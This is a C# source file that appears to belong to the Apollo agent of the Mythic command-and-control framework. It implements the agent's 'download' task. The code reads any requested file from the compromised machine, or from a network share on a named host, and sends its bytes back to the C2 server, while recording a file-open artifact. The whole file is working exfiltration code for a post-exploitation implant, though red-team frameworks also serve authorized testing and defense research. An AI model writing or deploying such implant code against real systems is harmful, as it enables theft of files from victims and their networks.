﻿#define COMMAND_NAME_UPPER

#if DEBUG
#define DOWNLOAD
#endif

#if DOWNLOAD

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System.Runtime.Serialization;
using ApolloInterop.Serializers;
using System.Threading;
using System.IO;

namespace Tasks
{
    public class download : Tasking
    {
        [DataContract]
        internal struct DownloadParameters
        {
            [DataMember(Name = "file")]
            public string FileName;
            [DataMember(Name = "host")]
            public string Hostname;
        }

        public download(IAgent agent, Task task) : base(agent, task)
        {

        }

        public override void Kill()
        {
            _cancellationToken.Cancel();
        }

        public override System.Threading.Tasks.Task CreateTasking()
        {
            return new System.Threading.Tasks.Task(() =>
            {
                TaskResponse resp;
                try
                {
                    DownloadParameters parameters = _jsonSerializer.Deserialize<DownloadParameters>(_data.Parameters);
                    if (string.IsNullOrEmpty(parameters.Hostname) && !File.Exists(parameters.FileName))
                    {
                        resp = CreateTaskResponse(
                            $"File '{parameters.FileName}' does not exist.",
                            true,
                            "error");
                    } else
                    {
                        string path = string.IsNullOrEmpty(parameters.Hostname) ? parameters.FileName : $@"\\{parameters.Hostname}\{parameters.FileName}";
                        byte[] fileBytes = File.ReadAllBytes(path);
                        IMythicMessage[] artifacts = new IMythicMessage[1]
                        {
                            new Artifact
                            {
                                BaseArtifact = "FileOpen",
                                ArtifactDetails = path
                            }
                        };
                        if (_agent.GetFileManager().PutFile(
                            _cancellationToken.Token,
                            _data.ID,
                            fileBytes,
                            parameters.FileName,
                            out string mythicFileId,
                            false,
                            parameters.Hostname))
                        {
                            resp = CreateTaskResponse(mythicFileId, true, "completed", artifacts);
                        } else
                        {
                            resp = CreateTaskResponse(
                                $"Download of {path} failed or aborted.",
                                true,
                                "error", artifacts);
                        }
                    }
                } catch (Exception ex)
                {
                    resp = CreateTaskResponse($"Unexpected error: {ex.Message}\n\n{ex.StackTrace}", true, "error");
                }
                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
            }, _cancellationToken.Token);
        }
    }
}
#endif